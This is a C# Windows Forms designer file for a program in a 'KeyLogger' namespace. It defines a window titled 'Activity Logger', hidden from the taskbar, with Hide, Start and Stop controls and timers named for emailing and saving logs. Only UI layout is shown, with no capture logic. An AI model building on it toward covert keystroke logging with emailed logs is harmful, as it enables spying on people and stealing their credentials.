using System.Windows.Forms;
namespace KeyLogger
{
    partial class FrmMain
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            this.txt_Log = new System.Windows.Forms.TextBox();
            this._timer = new System.Windows.Forms.Timer(this.components);
            this.btn_Exit = new System.Windows.Forms.Button();
            this.btn_hide = new System.Windows.Forms.Button();
            this.txt_CurrentWindowstitle = new System.Windows.Forms.TextBox();
            this.buttonStop = new System.Windows.Forms.Button();
            this.buttonStart = new System.Windows.Forms.Button();
            this.timer_emailer = new System.Windows.Forms.Timer(this.components);
            this.timer_logsaver = new System.Windows.Forms.Timer(this.components);
            this.main_Menu = new System.Windows.Forms.MainMenu(this.components);
            this.menuItem1 = new System.Windows.Forms.MenuItem();
            this.mnuItem_Hide = new System.Windows.Forms.MenuItem();
            this.mnuItem_Save = new System.Windows.Forms.MenuItem();
            this.menuItem3 = new System.Windows.Forms.MenuItem();
            this.mnuItem_Exit = new System.Windows.Forms.MenuItem();
            this.menuItem5 = new System.Windows.Forms.MenuItem();
            this.mnuItem_Settings = new System.Windows.Forms.MenuItem();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.SuspendLayout();
            // 
            // txt_Log
            // 
            this.txt_Log.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txt_Log.Location = new System.Drawing.Point(6, 134);
            this.txt_Log.Multiline = true;
            this.txt_Log.Name = "txt_Log";
            this.txt_Log.ReadOnly = true;
            this.txt_Log.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_Log.Size = new System.Drawing.Size(334, 108);
            this.txt_Log.TabIndex = 7;
            // 
            // _timer
            // 
            this._timer.Enabled = true;
            this._timer.Tick += new System.EventHandler(this.Timer1Tick);
            // 
            // btn_Exit
            // 
            this.btn_Exit.Location = new System.Drawing.Point(180, 52);
            this.btn_Exit.Name = "btn_Exit";
            this.btn_Exit.Size = new System.Drawing.Size(155, 28);
            this.btn_Exit.TabIndex = 10;
            this.btn_Exit.Text = "Exit";
            this.btn_Exit.Click += new System.EventHandler(this.BtnExitClick);
            // 
            // btn_hide
            // 
            this.btn_hide.Location = new System.Drawing.Point(13, 52);
            this.btn_hide.Name = "btn_hide";
            this.btn_hide.Size = new System.Drawing.Size(155, 28);
            this.btn_hide.TabIndex = 11;
            this.btn_hide.Text = "Hide";
            this.btn_hide.Click += new System.EventHandler(this.BtnHideClick);
            // 
            // txt_CurrentWindowstitle
            // 
            this.txt_CurrentWindowstitle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txt_CurrentWindowstitle.Location = new System.Drawing.Point(6, 108);
            this.txt_CurrentWindowstitle.Name = "txt_CurrentWindowstitle";
            this.txt_CurrentWindowstitle.ReadOnly = true;
            this.txt_CurrentWindowstitle.Size = new System.Drawing.Size(334, 22);
            this.txt_CurrentWindowstitle.TabIndex = 13;
            this.txt_CurrentWindowstitle.Text = "Current Window Title";
            // 
            // buttonStop
            // 
            this.buttonStop.Image = global::KeyLogger.Properties.Resources.DeleteRed;
            this.buttonStop.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.buttonStop.Location = new System.Drawing.Point(180, 12);
            this.buttonStop.Name = "buttonStop";
            this.buttonStop.Size = new System.Drawing.Size(155, 34);
            this.buttonStop.TabIndex = 5;
            this.buttonStop.Text = "Stop";
            this.buttonStop.Click += new System.EventHandler(this.ButtonStopClick);
            // 
            // buttonStart
            // 
            this.buttonStart.Image = global::KeyLogger.Properties.Resources.Begin;
            this.buttonStart.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.buttonStart.Location = new System.Drawing.Point(13, 12);
            this.buttonStart.Name = "buttonStart";
            this.buttonStart.Size = new System.Drawing.Size(155, 34);
            this.buttonStart.TabIndex = 4;
            this.buttonStart.Text = "Start";
            this.buttonStart.Click += new System.EventHandler(this.ButtonStartClick);
            // 
            // timer_emailer
            // 
            this.timer_emailer.Interval = 600000;
            // 
            // timer_logsaver
            // 
            this.timer_logsaver.Interval = 600000;
            this.timer_logsaver.Tick += new System.EventHandler(this.TimerLogsaverTick);
            // 
            // main_Menu
            // 
            this.main_Menu.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.menuItem1,
            this.menuItem5});
            // 
            // menuItem1
            // 
            this.menuItem1.Index = 0;
            this.menuItem1.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.mnuItem_Hide,
            this.mnuItem_Save,
            this.menuItem3,
            this.mnuItem_Exit});
            this.menuItem1.Text = "&Main";
            // 
            // mnuItem_Hide
            // 
            this.mnuItem_Hide.Index = 0;
            this.mnuItem_Hide.Text = "&Hide";
            this.mnuItem_Hide.Click += new System.EventHandler(this.MnuItemHideClick);
            // 
            // mnuItem_Save
            // 
            this.mnuItem_Save.Index = 1;
            this.mnuItem_Save.Text = "&Save";
            this.mnuItem_Save.Click += new System.EventHandler(this.MnuItemSaveClick);
            // 
            // menuItem3
            // 
            this.menuItem3.Index = 2;
            this.menuItem3.Text = "-";
            // 
            // mnuItem_Exit
            // 
            this.mnuItem_Exit.Index = 3;
            this.mnuItem_Exit.Text = "E&xit";
            this.mnuItem_Exit.Click += new System.EventHandler(this.MnuItemExitClick);
            // 
            // menuItem5
            // 
            this.menuItem5.Index = 1;
            this.menuItem5.MenuItems.AddRange(new System.Windows.Forms.MenuItem[] {
            this.mnuItem_Settings});
            this.menuItem5.Text = "&Options";
            // 
            // mnuItem_Settings
            // 
            this.mnuItem_Settings.Index = 0;
            this.mnuItem_Settings.Text = "Set&tings";
            this.mnuItem_Settings.Click += new System.EventHandler(this.mnuItem_Settings_Click);
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
            this.notifyIcon1.Text = "notifyIcon1";
            this.notifyIcon1.Visible = true;
            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
            // 
            // FrmMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.ClientSize = new System.Drawing.Size(349, 254);
            this.Controls.Add(this.txt_CurrentWindowstitle);
            this.Controls.Add(this.btn_hide);
            this.Controls.Add(this.btn_Exit);
            this.Controls.Add(this.txt_Log);
            this.Controls.Add(this.buttonStop);
            this.Controls.Add(this.buttonStart);
            this.MaximizeBox = false;
            this.Menu = this.main_Menu;
            this.Name = "FrmMain";
            this.RightToLeftLayout = true;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Activity Logger";
            this.Load += new System.EventHandler(this.MainFormLoad);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox txt_Log;
        private System.Windows.Forms.Button buttonStop;
        private System.Windows.Forms.Button buttonStart;
        private System.Windows.Forms.Timer _timer;
        private System.Windows.Forms.Button btn_Exit;
        private System.Windows.Forms.Button btn_hide;
        private TextBox txt_CurrentWindowstitle;
        private Timer timer_emailer;
        private Timer timer_logsaver;
        private MainMenu main_Menu;
        private MenuItem menuItem1;
        private MenuItem mnuItem_Hide;
        private MenuItem menuItem3;
        private MenuItem mnuItem_Exit;
        private MenuItem menuItem5;
        private MenuItem mnuItem_Settings;
        private MenuItem mnuItem_Save;
        private NotifyIcon notifyIcon1;

    }
}

